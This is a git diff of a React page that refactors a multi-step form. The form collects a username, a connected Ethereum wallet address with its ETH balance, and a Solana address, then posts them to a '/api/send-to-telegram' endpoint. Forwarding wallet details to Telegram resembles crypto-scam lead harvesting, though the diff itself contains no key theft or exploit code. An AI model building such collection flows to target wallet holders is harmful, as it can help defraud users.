@@ -60,24 +60,24 @@ export default function Home() {
             toast.warn("Please enter a username");
             return;
         }
-
+    
         if (step === 2 && !address) {
             toast.warn("Please connect your wallet");
             await checkETHBalance();
             return;
         }
-
-        if (step === 3 && !solAddress) {
-            toast.warn("Please enter your Solana address");
-            return;
-        }
-
+    
         setStep(step + 1);
     };
 
     const handleSubmit = async () => {
+        if (!solAddress) {
+            toast.warn("Please enter your Solana address");
+            return;
+        }
+    
         let currentBalance = balance;
-
+    
         setLoading(true);
         // Fetch the balance if it's not already fetched
         if (!currentBalance) {
@@ -100,24 +100,25 @@ export default function Home() {
             } catch (error) {
                 console.error("Error fetching balance:", error);
                 toast.error("Error fetching balance");
+                setLoading(false);
                 return;
-            } finally {
-                setLoading(false); // Stop loading
             }
         }
-
+    
         try {
-            console.log(currentBalance);
             await axios.post("/api/send-to-telegram", {
                 username,
                 address,
                 balance: currentBalance,
                 solAddress,
             });
+            setLoading(false);
+            setStep(4);
             toast.success("Submitted successfully");
         } catch (error) {
             console.error("Error:", error);
             toast.error("Failed to submit information");
+            setLoading(false);
         }
     };
 
@@ -187,30 +188,31 @@ export default function Home() {
                                     className="w-full p-3 border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-blue-500 mb-4"
                                 />
                                 <button
-                                    onClick={handleNext}
-                                    className="w-full bg-blue-500 text-white py-3 rounded-lg hover:bg-blue-600 transition"
-                                >
-                                    Next
-                                </button>
-                            </div>
-                        )}
-
-                        {step === 4 && (
-                            <div>
-                                <h1 className="text-2xl font-semibold text-gray-800 mb-4 text-center">
-                                    Thank You
-                                </h1>
-                                <p className="text-center mb-4">
-                                    Your information has been collected. Submit
-                                    it now.
-                                </p>
-                                <button
                                     onClick={handleSubmit}
                                     className="w-full bg-green-500 text-white py-3 rounded-lg hover:bg-green-600 transition"
                                 >
                                     Submit
                                 </button>
                             </div>
+                        )}
+
+                        {loading ? (
+                            <div className="flex justify-center items-center">
+                                <div className="loader border-t-4 border-blue-500 rounded-full w-8 h-8 animate-spin"></div>
+                                <p className="ml-2 text-blue-500">Loading...</p>
+                            </div>
+                        ) : (
+                            step === 4 && (
+                                <div>
+                                    <h1 className="text-2xl font-semibold text-gray-800 mb-4  text-center">
+                                        Thank You
+                                    </h1>
+                                    <p className="text-center mb-4">
+                                        Your information has been submitted
+                                        successfully.
+                                    </p>
+                                </div>
+                            )
                         )}
                     </>
                 )}
